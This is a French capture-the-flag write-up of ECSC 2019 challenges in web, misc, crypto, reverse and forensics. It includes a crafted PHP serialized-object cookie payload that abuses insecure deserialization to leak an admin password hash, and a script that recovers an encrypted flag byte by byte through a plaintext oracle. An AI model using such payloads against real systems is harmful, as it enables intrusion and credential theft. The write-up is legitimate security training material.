	if($u->login($_POST['login'], $_POST['password'])) {   // appel de la méthode de l'objet $u... que l'on contrôle
	setcookie('user', serialize($u));  
	presult('Hello '.htmlspecialchars($u->username).', here is your flag: 
			'.file_get_contents('includes/__flag'));    // si l'on passe cette condition, c'est gagné
	} else { 
		presult('Invalid login/password combination');  
	}  
}  
?>
```

Ce qu'il y a à retenir :

 - On peut contrôler un certain objet `u` de type `User` depuis le cookie via une déserialisation d'objet
 - Il suffit d'envoyer des données dans le formulaire pour passer la première condition
 - La deuxième condition utilise l'objet `u`
 - Il suffit de la passer pour avoir le flag : `u->login($login, $password)` = true


La classe `User` contient deux attributs :

 - `core` de type `Core`, la troisième classe du challenge
 - `username` défini à NULL par défaut, mais que l'on peut donc manipuler via la déserialisation

La fonction `login` renvoie le résultat de la fonction `core->doUserLogin($login, $password)`.


Deux choses sont à remarquer dans le dernier fichier. La première est la ligne de retour :
`return (md5($password)==$row['password']) ? $row : NULL;`
Étant donné que l'on maitrise `$password`, on maitrise également `md5($password)`.

La deuxième est l'attribut de classe `$this->debug`, qui lorsqu'il est mis à `true` affiche le résultat de la requête SQL.

### Exploitation

On va donc, à l'aide de php et des codes sources fournis, créer un objet de type `User` sérialisé.
`O:4:"User":2:{s:4:"core";O:4:"Core":2:{s:5:"debug";b:1;s:3:"con";O:7:"SQLite3":0:{}}s:8:"username";s:5:"admin";}`
À celui-ci nous allons dors et déjà mettre le `username` à `admin` et le booléen `debug` à `1`. Maintenant, il suffit de créer un cookie nommé `user` et d'essayer de se logger. Le mot de passe ici n'a peu d'importance. 
```
Found user record:array(6) { [0]=> int(1) ["id"]=> int(1) [1]=> string(5) "admin" ["login"]=> string(5) "admin" [2]=> string(32) "34819d7beeabb9260a5c854bc85b3e44" ["password"]=> string(32) "34819d7beeabb9260a5c854bc85b3e44" }
```
Bingo, le mode debug s'est activé nous affichant le résultat de la requête `"SELECT id, login, password FROM users WHERE login='{$pLogin}'");`. 
Avec une recherche google du mot de passe hashé, on retrouve facilement le mot de passe en clair `mypassword`. On se connecte avec `admin:mypassword` : 
`Hello admin, here is your flag: ECSC{3ab6be9c0d274e7eeac6f20f4bee7d8b26303e44}`.

Nice game!


# [+] Misc
## qrcode

Ce challenge est disponible avec `nc challenges.ecsc-teamfrance.fr 3001`. Essayons !
```
$ nc challenges.ecsc-teamfrance.fr 3001
Programming challenge
---------------------
I will send you a PNG image compressed by zlib encoded in base64 that contains 64 encoded numbers.
The expected answer is the sum of all the numbers (in decimal).
You have 2 seconds.
Are you ready? [Y/N]
>> y
eJztvQ1UU1f6N+pMx3FGrc7cDFNBgZnp6zBqxeIxIoTgtE6h2gqlkESCAWuaRBI+xBAihEhHazt0
+JjWDwySUIsVzBdCCB8JhOIwydgkpIhJCCEJGpsA+YJGEjAC7znQ6cz9r/+9a73vO1lr1r1lLVgn
h71g77P3s5/n99u/5zmVb6UkP78+bP2aNWueP/z6H95es+anP4O+f/JD8M65P8BOrFnzlxuH//BK
xtkGp3GgXfSSfvdXtek9y1m2feaUsMCNZ4d+ssG2xXT5o+irW0iGMs/yc2ugr/cylgv9a1a/TkT9
...
bvbwfHef36hJOOdUFfEirv82/8uUcRpDaLiMI30p5I3RHOYXRTPhuen7r+7fAFBK9kiHLrsqxrkO
+bUd4CXT3h117u1wgKBntTtSns3hVa2Rlne+lFHHkR6CJpBti/x/7sb/5nggkRB89fr3ocv/rmfy
b3u4/9/7Q77nTO2f/2bjh2/mQR8Pv5byB+GrJ87/T7gde9o=
What is you answer?
>>
```

Donc, il faut récupérer le contenu (que l'on appelera `cipher`) envoyé, puis faire `zlib.decompress(b64decode(cipher))` pour obtenir un PNG. 
Une fois cela fait, on trouve sur le PNG 64 qrcode bien rangés en 8 colonnes par 8 lignes. Il suffit donc de découper l'image en 64 carrés puis de décoder chaque qrcode. Allô python ?

```
from netcat import Netcat
import base64
import zlib
import qrtools
from PIL import Image

# start a new Netcat() instance
nc = Netcat('challenges.ecsc-teamfrance.fr', 3001)

# get to the prompt
nc.read_until('>')
nc.write('Y\n')

img_compressed_b64 = nc.read_until('What').split("What")[0]
img_compressed = base64.b64decode(img_compressed_b64)
img = zlib.decompress(img_compressed)

f = open('img.png', 'w+')
f.write(img)
f.close()

img = Image.open('img.png')

tot_num = 0
c = img.size[0]/8 
for i in range(8):
    for j in range(8):
        box = (i*c, j*c, i*c+c, j*c+c)
        qr_img = img.crop(box)
        qr_img.save('img_tmp.png', "PNG")
        qr = qrtools.QR()
        qr.decode('img_tmp.png')
        qr_val = qr.data
        tot_num += int(qr_val)

# start a new note
nc.write(str(tot_num) + '\n')
print nc.read()
```
Réponse du serveur : `Congrats! Here is your flag: ECSC{e076963c132ec49bce13d47ea864324326d4cefa}`

# [+] Crypto
## 2tp
Reprenons notre vieil ami `nc` :).
```
$ nc challenges.ecsc-teamfrance.fr 2000
Welcome to our state-of-the-art encryption service!
We use PBKDF2 and AES-GCM!
As an example, here is the encrypted flag: 7b656d3993152e8f04f8273ca1509e27a3e39249cf4784e23b81d5f2524fee75f6b28a6a07a128e4880e770bc70b32bd7d5f37bb5eba76d38edb8d1964733b

Now, enter your text: AAAAAAAAAA
Here is your ciphertext: 7f677f3ba93058ab75810810ff227ab136a1444003aded37e35b
```

Nous avons donc le flag chiffré et nous pouvons donner un clair que nous connaissons pour chiffrer avec le même algorithme. Hmmm... Attaque par clair connu ? 

Comme il l'est si bien mentionné sur l'accueil du site, `Le format des flags est ECSC{xxxx} où "xxxx" est une chaîne contenant des caractères ASCII imprimables.`. Et si on envoyait `ECSC{` au serveur ?

```
$ nc challenges.ecsc-teamfrance.fr 2000
Welcome to our state-of-the-art encryption service!
We use PBKDF2 and AES-GCM!
As an example, here is the encrypted flag: 7b656d3993152e8f04f8273ca1509e27a3e39249cf4784e23b81d5f2524fee75f6b28a6a07a128e4880e770bc70b32bd7d5f37bb5eba76d38edb8d1964733b

Now, enter your text: ECSC{
Here is your ciphertext: 7b656d3993d956d6c1d7b2348bbf8ebc224d70d869
```
On retrouve le même début `7b656d3993` ! Y'a plus qu'à tester caractère par caractère :)  Ayant fait d'autres épreuves avant, j'ai essayé de tenter uniquement avec des caractères dans le range hexadécimal. 

***Python, à toi de jouer !***

![](http://i.imgur.com/GBf5Kue.gif)

```
from netcat import Netcat

flag = "7b656d3993152e8f04f8273ca1509e27a3e39249cf4784e23b81d5f2524fee75f6b28a6a07a128e4880e770bc70b32bd7d5f37bb5eba76d38edb8d1964733b"

charset = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','}']

plain = "ECSC{"

for i in range(50):
    for c in charset:        
        nc = Netcat('challenges.ecsc-teamfrance.fr', 2000)
        nc.read()
        nc.write(plain + str(c) + "}\n")
        res = nc.read()
        h = res.split()[4]
        deb = 10+i*2
        fin = 10+i*2+2
        print c
        if (h[deb:fin] == flag[deb:fin]):
            print plain+str(c)+":"+(h)
            plain += str(c)
            break
```

***C'est super efficace !***
`ECSC{d7e080292d95f131e07241a98dc6c1aa10279889}`



# [+] Reverse
## ybab
Mais qu'est-ce donc que ce fichier ?
```
$ file baby
baby: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=57877dcd71cd9a66c3d3a3b75425d85e9a50c040, with debug_info, not stripped
```
Okay, lancons le !

```
$ ~/Downloads/baby         
Nope, I won't give you the flag *that* easily!
```

Oh ... Peut-être que le flag est en dur dans le code alors ?
```
$ strings ~/Downloads/baby | grep ECSC
ECSC{cdcd13c4c81a23a21506fa8efa5edff781e9fe80}
/home/julien/ECSC/challenges/reverse/baby
```
Merci Julien ! :)

## Vault
Mais qu'est-ce donc que ce fichier ?
```
$ file vault 
vault: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=29f72609e9d07b048545e63694738662fea248da, with debug_info, not stripped
```
Okay, lancons le !
```
$ echo asd | ./vault
=-=-=-= Very secure vault =-=-=-=
Please enter you very secure password: 
Wrong password: authorities have been alerted!
```
Le programme prend donc en entrée un password, le vérifie dans une routine, j'imagine. Regardons avec `r2` quelles fonctions sont implémentées.

```
[0x00000810]> afl
0x00000810    1 42           entry0
0x00000840    4 50   -> 40   sym.deregister_tm_clones
0x00000880    4 66   -> 57   sym.register_tm_clones
0x000008d0    5 58   -> 51   entry.fini0
0x00000800    1 6            sym..plt.got
0x00000910    1 10           entry.init0
0x00000c60    1 2            sym.__libc_csu_fini
0x00000c64    1 9            sym._fini
0x0000091a    1 76           sym.check_char
0x00000bf0    4 101          sym.__libc_csu_init
0x00000966   17 646          main
0x000007c0    1 6            sym.imp.tcgetattr
0x000007f0    1 6            sym.imp.fwrite
0x000007e0    1 6            sym.imp.exit
0x000007d0    1 6            sym.imp.tcsetattr
0x00000780    1 6            sym.imp.puts
0x00000790    1 6            sym.imp.printf
0x000007b0    1 6            sym.imp.fflush
0x00000770    1 6            sym.imp.putchar
0x000007a0    1 6            sym.imp.getchar
0x00000748    3 23           sym._init
0x00000000    3 97   -> 123  loc.imp._ITM_deregisterTMCloneTable
0x00000063    1 110          fcn.00000063
``` 

On a une fonction `sym.check_char` qui semble être intéressante. En lisant le code assembleur, on peut confirmer cette pensée puisqu'elle est appelée dans une boucle ou un certain `obj.flag` s'y trouve également. L'idée est maintenant de regarder en live les arguments passés à cette fonction, en ajoutant un breakpoint à l'appel avec `gdb`. 

On peut alors facilement voir que chaque caractère d'indice `i` est comparé avec chaque caractère `i%l`, `l` étant la taille du password. Le password est sous la forme de hash et il faudra utiliser ECSC{hash} pour valider le challenge. 

# [+] Forensics
## Not so FAT
Comme à mon habitude, avant de commencer à chercher, je regarder à quel type de fichier j'ai à faire.
```
$ file image.dd 
image.dd: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID "mkfs.fat", sectors/cluster 4, reserved sectors 4, root entries 512, sectors 32768 (volumes <=32 MB), Media descriptor 0xf8, sectors/FAT 32, sectors/track 32, heads 64, serial number 0x3be84c04, unlabeled, FAT (16 bit)
```
Après quelques recherches sur internet, `testdisk` s'avère être un outil bien adapté pour ce challenge.

```
$ testdisk image.dd
------------------
TestDisk 7.0, Data Recovery Utility, April 2015
Christophe GRENIER <grenier@cgsecurity.org>
http://www.cgsecurity.org

  TestDisk is free software, and
comes with ABSOLUTELY NO WARRANTY.

Select a media (use Arrow keys, then press Enter):
>Disk image.dd - 16 MB / 16 MiB

>[Proceed ]  [  Sudo  ]  [  Quit  ]
------------------
Disk image.dd - 16 MB / 16 MiB

Please select the partition table type, press Enter when done.
 [Intel  ] Intel/PC partition
 [EFI GPT] EFI GPT partition map (Mac i386, some x86_64...)
 [Humax  ] Humax partition table
 [Mac    ] Apple partition map
>[None   ] Non partitioned media
 [Sun    ] Sun Solaris partition
 [XBox   ] XBox partition
 [Return ] Return to disk selection
------------------
Disk image.dd - 16 MB / 16 MiB
     CHS 16 64 32 - sector size=512

 [ Analyse  ] Analyse current partition structure and search for lost partitions
>[ Advanced ] Filesystem Utils
 [ Geometry ] Change disk geometry
 [ Options  ] Modify options
 [ Quit     ] Return to disk selection
------------------
Disk image.dd - 16 MB / 16 MiB - CHS 16 64 32

     Partition                  Start        End    Size in sectors
>   P FAT16                    0   0  1    15  63 32      32768 [NO NAME]

 [  Type  ] >[  Boot  ]  [Undelete]  [Image Creation]  [  Quit  ]
                              Boot sector recovery
------------------
Disk image.dd - 16 MB / 16 MiB - CHS 16 64 32
     Partition                  Start        End    Size in sectors
   P FAT16                    0   0  1    15  63 32      32768 [NO NAME]

Boot sector
check_FAT: Unusual number of reserved sectors 4 (FAT), should be 1.
OK

A valid FAT Boot sector must be present in order to access
any data; even if the partition is not bootable.

 [  Quit  ] >[Rebuild BS]  [  List  ]  [  Dump  ]  [Repair FAT]  
                             Rebuild boot sector
------------------
Disk image.dd - 16 MB / 16 MiB - CHS 16 64 32
     Partition                  Start        End    Size in sectors
   P FAT16                    0   0  1    15  63 32      32768 [NO NAME]

FAT : 12
cluster_size 2 4
reserved     4 4
sectors      21944 32768
fat_length   32 32
dir_entries  576 512
Extrapolated boot sector and current boot sector are different.

 [  Dump  ] >[  List  ]  [ Write  ]  [  Quit  ]
                           List directories and files
------------------
   P FAT12                    0   0  1    15  63 32      32768 [NO NAME]
Directory /

>-rwxr-xr-x     0     0         0 10-May-2019 07:09 ziEuYrJW
 -rwxr-xr-x     0     0       241 10-May-2019 07:09 flag.zip
------------------
```
Après avoir passé toutes ces étapes par défault (avec réparation du boot sector), on tombe sur 2 fichiers `ziEuYrJW` et `flag.zip`. J'extrait les deux pour voir ce qu'ils contiennent. Rien dans le premier fichier et l'archive est protégée par un mot de passe, qui s'avère être `password` après quelques essais de guessing.
```
$ unzip flag.zip
Archive:  flag.zip
[flag.zip] flag.txt password: 
 extracting: flag.txt                

$ cat flag.txt
ECSC{eefea8cda693390c7ce0f6da6e388089dd615379}
```
 
## Exfiltration
Nous avons donc à notre disposition un fichier de capture réseau dans lequel nous devons trouver un fichier confidentiel qui a été exfiltré. En analysant de plus près les échanges, on peut voir que les communications entre `192.168.1.26` et `198.18.1.10` sont suspectes. 

Tout d'abord, des paquets ICMP sont échangés dans lesquels se trouvent des données très intéressantes pour nous, et peu discrètes :

 - `config : exfiltered_file_size = 4193`
 - `config : file_type = DOCX`
 - `config : data_len_for_each_packet = random`
 - `config : encryption = XOR`

On sait donc qu'il y a un fichier DOCX de 4193 octets, chiffré en XOR, découpé en paquets de taille random envoyé de `192.168.1.26` (machine infectée) à `198.18.1.10` (vilain pirate).

Après ces échanges, on voit une deuxième suite d'échanges, cette fois-ci en HTTP. On voit que des requêtes POST partent de la machine de la victime avec un paramètre `data` contenant des données en hexadécimal. 

Ayant la liste exhaustive de ces paquets, je les ai exporté en un nouveau fichier `pcap` ne contenant uniquement ceux-ci. À l'aide de mon meilleur ami python, j'ai pu réassembler les morceaux de data pour reformer le fichier chiffré. Sachant que la méthode de chiffrement est le XOR et que le fichier est un DOCX, il était facile de retrouver la clé par une attaque par clair connu (`a^b^a = b`). Étant donné que tous les fichiers DOCX commencent par les mêmes caractères (magic number = `50 4B 03 04`), j'ai pu retrouver la clé de chiffrement du vilain pirate : `ecsc`.

Voici le script python complet qui m'a permis de reconstituer le document original.
```
cipher = ''
p = open('packets.pcap', 'r')
for l in p.readlines():
    if l.startswith('data='):
        cipher += l.split('&')[0].split('=')[1]
p.close()
c = cipher.decode('hex')

k = "ecsc"
d = [] 

for i in range(len(c)):
    new_c = ord(c[i])^ord(k[i%len(k)])
    d.append(new_c)

f = open('deciphered.docx', 'wb')
f.write(bytearray(d))
f.close()
```   
Dans le document `deciphered.docx` était écrit le flag en clair : `ECSC{v3ry_n01sy_3xf1ltr4t10n}`

## 3615 Incident (1)
Pour ce challenge, nous dispons d'une image mémoire, `mem.dmp`.
```
$ file mem.dmp
mem.dmp: MS Windows 64bit crash dump, full dump, 344794 pages
```
Comme tout bon challenge de forensics, ouvrons l'image mémoire avec volatility, déjà pour en savoir plus sur le binaire.
```
$ volatility -f mem.dmp imageinfo                         
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
WARNING : volatility.debug    : Alignment of WindowsCrashDumpSpace64 is too small, plugins will be extremely slow
          Suggested Profile(s) : Win10x64_17134, Win10x64_10240_17770, Win10x64_14393, Win10x64_10586, Win10x64, Win2016x64_14393, Win10x64_16299, Win10x64_15063 (Instantiated with Win10x64_15063)
                     AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)
                     AS Layer2 : WindowsCrashDumpSpace64 (Unnamed AS)
                     AS Layer3 : FileAddressSpace (/home/kiwhacks/ecsc/3615/mem.dmp)
                      PAE type : No PAE
                           DTB : 0x1ab000L
                          KDBG : 0xf801f433ba60L
          Number of Processors : 2
     Image Type (Service Pack) : 0
                KPCR for CPU 0 : 0xfffff801f4394000L
                KPCR for CPU 1 : 0xffffd0012eb07000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2019-05-08 20:04:11 UTC+0000
     Image local date and time : 2019-05-08 22:04:11 +0200
```

Outch, plein de warnings ! (Et on est pas au bout de nos surprises...)
Nous avons donc à faire à un dump Windows 10.  Qu'en est-il des processus en cours d'execution ?

```
$ volatility -f mem.dmp --profile=Win10x64_15063 psscan   
Volatility Foundation Volatility Framework 2.6.1
Offset(P)          Name                PID   PPID PDB                Time created                   Time exited                   
------------------ ---------------- ------ ------ ------------------ ------------------------------ ------------------------------
WARNING : volatility.debug    : NoneObject as string: Invalid Address 0xC000BCFC0136, instantiating ImageFileName
WARNING : volatility.debug    : NoneObject as string: Invalid Address 0xC000BD2B00A6, instantiating ImageFileName
0x0000e0000f65a040 System                0      0 0x00000000001ab000 2019-05-08 19:57:03 UTC+0000                                 
0x0000e0000f683840 svchost.exe           0    592 0x000000004c22d000 2019-05-08 19:57:06 UTC+0000                                 
0x0000e0000f685840 svchost.exe           0    592 0x000000000d354000 2019-05-08 19:57:06 UTC+0000                                 
0x0000e0000f823340 msdtc.exe             0    592 0x0000000023087000 2019-05-08 19:57:10 UTC+0000                                 
0x0000e0000f839840 NisSrv.exe            0    592 0x000000001f8d4000 2019-05-08 19:57:10 UTC+0000                                 
0x0000e00010335080 conhost.exe           0   5208 0x000000002ccca000 2019-05-08 20:00:16 UTC+0000                                 
0x0000e00010347080 firefox.exe           0   4040 0x000000000d5bb000 2019-05-08 19:59:09 UTC+0000                                 
0x0000e00010385080 firefox.exe           0   4040 0x0000000036804000 2019-05-08 19:59:08 UTC+0000                                 
0x0000e00010441600 taskhostw.exe         0    944 0x000000002c02e000 2019-05-08 20:02:15 UTC+0000                                 
0x0000e0001051b080 conhost.exe           0   5596 0x000000002e4bc000 2019-05-08 20:04:09 UTC+0000                                 
0x0000e0001051c840 DumpIt.exe            0   3184 0x000000003ce96000 2019-05-08 20:04:09 UTC+0000                                 
0x0000e000106bb840 assistance.exe        0   3184 0x00000000083fe000 2019-05-08 20:00:16 UTC+0000                                 
0x0000e00010aba840 sihost.exe            0    944 0x000000001f35f000 2019-05-08 19:57:14 UTC+0000                                 
0x0000e00010e4b040 smss.exe              0      4 0x000000000f10c000 2019-05-08 19:57:03 UTC+0000                                 
0x0000e00010ef2080 csrss.exe             0    348 0x000000004e07f000 2019-05-08 19:57:05 UTC+0000                                 
0x0000e00011196080 firefox.exe           0   4040 0x000000003c6b8000 2019-05-08 19:59:11 UTC+0000                                 
0x0000e00011302080 wininit.exe           0    348 0x000000004fcc5000 2019-05-08 19:57:05 UTC+0000                                 
0x0000e00011305180 csrss.exe             0    464 0x00000000003f1000 2019-05-08 19:57:05 UTC+0000                                 
0x0000e00011344080 winlogon.exe          0    464 0x000000004b237000 2019-05-08 19:57:05 UTC+0000                                 
0x0000e00011399840 services.exe          0    472 0x000000004b994000 2019-05-08 19:57:05 UTC+0000                                 
0x0000e000113a2840 lsass.exe             0    472 0x00000000036b2000 2019-05-08 19:57:05 UTC+0000                                 
0x0000e000113dd480 svchost.exe           0    592 0x0000000008607000 2019-05-08 19:57:05 UTC+0000                                 
0x0000e000113f2180 svchost.exe           0    592 0x0000000008a9e000 2019-05-08 19:57:06 UTC+0000                                 
0x0000e000115ac840 dllhost.exe           0    592 0x000000001e54c000 2019-05-08 19:57:09 UTC+0000                                 
0x0000e000115ae840 WmiPrvSE.exe          0    684 0x000000001d0ce000 2019-05-08 19:57:09 UTC+0000                                 
0x0000e00011617840 spoolsv.exe           0    592 0x0000000010835000 2019-05-08 19:57:06 UTC+0000                                 
0x0000e000116e3080 explorer.exe          0   3120 0x0000000026b8d000 2019-05-08 19:57:14 UTC+0000                                 
0x0000e00011739080 dwm.exe               0    544 0x00000000095e4000 2019-05-08 19:57:06 UTC+0000                                 
0x0000e00011779840 svchost.exe           0    592 0x000000000aa90000 2019-05-08 19:57:06 UTC+0000                                 
0x0000e00011789840 svchost.exe           0    592 0x000000000ad6d000 2019-05-08 19:57:06 UTC+0000                                 
0x0000e0001178c840 svchost.exe           0    592 0x000000000adb3000 2019-05-08 19:57:06 UTC+0000                                 
0x0000e0001179c840 svchost.exe           0    592 0x000000000affe000 2019-05-08 19:57:06 UTC+0000                                 
0x0000e000117e0840 svchost.exe           0    592 0x000000000bb7d000 2019-05-08 19:57:06 UTC+0000                                 
0x0000e000117e1080 vmacthlp.exe          0    592 0x000000000bbc3000 2019-05-08 19:57:06 UTC+0000                                 
0x0000e00011cc45c0 svchost.exe           0    592 0x0000000013658000 2019-05-08 19:57:07 UTC+0000                                 
0x0000e00011cf1840 VGAuthService.        0    592 0x0000000015be6000 2019-05-08 19:57:07 UTC+0000                                 
0x0000e00011cff840 vmtoolsd.exe          0    592 0x0000000015e07000 2019-05-08 19:57:07 UTC+0000                                 
0x0000e00011d0a840 svchost.exe           0    592 0x0000000015f50000 2019-05-08 19:57:07 UTC+0000                                 
0x0000e00011d1b840 MsMpEng.exe           0    592 0x0000000016522000 2019-05-08 19:57:07 UTC+0000                                 
0x0000e00011f8b080 SearchProtocol        0   3444 0x000000002cc2a000 2019-05-08 19:59:31 UTC+0000                                 
0x0000e00011f8f7c0 ShellExperienc        0    684 0x0000000028174000 2019-05-08 19:57:15 UTC+0000                                 
0x0000e00011fa8840 taskhostw.exe         0    944 0x000000001d464000 2019-05-08 19:57:14 UTC+0000                                 
0x0000e00012023580 RuntimeBroker.        0    684 0x0000000005162000 2019-05-08 19:57:14 UTC+0000                                 
0x0000e00012077240 SkypeHost.exe         0    684 0x0000000004c02000 2019-05-08 19:57:14 UTC+0000                                 
0x0000e00012155200 firefox.exe           0   4040 0x000000004ad3b000 2019-05-08 19:59:42 UTC+0000                                 
0x0000e0001225b840 SearchIndexer.        0    592 0x000000002738c000 2019-05-08 19:57:15 UTC+0000                                 
0x0000e00012268100 notepad.exe           0   3184 0x0000000033517000 2019-05-08 20:00:29 UTC+0000                                 
0x0000e000122aa840 svchost.exe           0    592 0x00000000322fd000 2019-05-08 19:57:23 UTC+0000                                 
0x0000e000123e21c0 SearchFilterHo        0   3444 0x0000000007dd8000 2019-05-08 20:02:52 UTC+0000                                 
0x0000e00012530080 MpCmdRun.exe          0   4932 0x0000000033ba7000 2019-05-08 19:59:43 UTC+0000                                 
0x0000e000125a7840 firefox.exe           0   3184 0x00000000349b1000 2019-05-08 19:59:06 UTC+0000                                 
0x0000e000125b8080 SearchUI.exe          0    684 0x0000000007ff5000 2019-05-08 20:00:03 UTC+0000                                 
0x0000e000125f7840 firefox.exe           0   4040 0x000000004ab93000 2019-05-08 19:59:07 UTC+0000                                 
0x0000e000125fb840 WmiPrvSE.exe          0    684 0x0000000039b3c000 2019-05-08 19:57:28 UTC+0000                                 
0x0000e00012620080 vmtoolsd.exe          0   3184 0x0000000037a56000 2019-05-08 19:57:27 UTC+0000                                 
0x0000e000126b7840 WUDFHost.exe          0    296 0x000000001d0fc000 2019-05-08 20:01:27 UTC+0000                                 
0x0000e000126d3080 audiodg.exe           0    964 0x000000003e528000 2019-05-08 20:00:15 UTC+0000                                 
0x0000e00012774080 OneDrive.exe          0   3184 0x0000000036158000 2019-05-08 19:57:29 UTC+0000                                 
0x0000e00012854840 MSASCui.exe           0   3184 0x000000002ebd6000 2019-05-08 20:01:01 UTC+0000                                 
0x0000e0001287a840 notepad++.exe         0   3184 0x00000000404f8000 2019-05-08 20:01:49 UTC+0000                                 
0x0000e00012910080 svchost.exe           0    592 0x0000000034a41000 2019-05-08 20:00:58 UTC+0000                                 
0x0000fd800005a040 System                0      0 0x00000000001ab000 2019-05-08 19:57:03 UTC+0000                                 
0x0000fd8000083840 svchost.exe           0    592 0x000000004c22d000 2019-05-08 19:57:06 UTC+0000                                 
0x0000fd8000085840 svchost.exe           0    592 0x000000000d354000 2019-05-08 19:57:06 UTC+0000                                 

```

Il y en a quelques uns, mais à première vue, rien de bien méchant. Par contre, aucun PID n'est affiché... Essayons avec `pstree` :
```
$ volatility -f mem.dmp --profile=Win10x64_15063 pstree
Volatility Foundation Volatility Framework 2.6.1
Name                                                  Pid   PPid   Thds   Hnds Time
-------------------------------------------------- ------ ------ ------ ------ ----
 0xffffe00010e4b048:                                  256      0      1 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00010385088:exe                              4736      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe0000f65a048:                                    4      0      5 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00012034088:.exe                             3120      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00012774088:.exe                             3080      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe000116e3088:.exe                             3184      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00012530088:.exe                             3248      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe0000f685848:exe                              1036      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00011f8b088:otocol                           5060      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00012854848:exe                              5840      0  32768 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe0000f823348:e                                2464      0  32768 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe0000f839848:xe                               2708      0  32768 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00011617848:exe                              1304      0  32772 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00011739088:                                  836      0  49152 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe000117e1088:.exe                              668      0  32768 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe000125b8088:.exe                             3888      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00011344088:.exe                              544      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00011cf1848:rvice.                           1712      0  32768 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe000117e0848:exe                               296      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00010aba848:xe                               2204      0  32768 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe000113dd488:exe                               684      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00011779848:exe                               944      0  32768 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00011cff848:.exe                             1732      0      4 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe000125fb848:.exe                             4916      0      4 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00011196088:exe                              3256      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe0001225b848:dexer.                           3444      0  32768 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00010347088:exe                              3744      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe0000f683848:exe                              1216      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00011d0a848:exe                              1760      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00012077248:t.exe                            3220      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00010335088:exe                              5224      0      1 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00011789848:exe                               964      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe0001051b088:exe                              5364      0      1 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe000115ac848:exe                              2308      0  32768 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe000125a7848:exe                              4040      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00012620088:.exe                             4812      0  32768 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe0001214e088:+.exe                            5496      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe0001178c848:exe                               972      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe000123e21c8:lterHo                           4320      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00012268108:exe                              5444      0      1 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00011399848:.exe                              592      0  32768 ------ 1970-01-01 00:00:00 UTC+0000
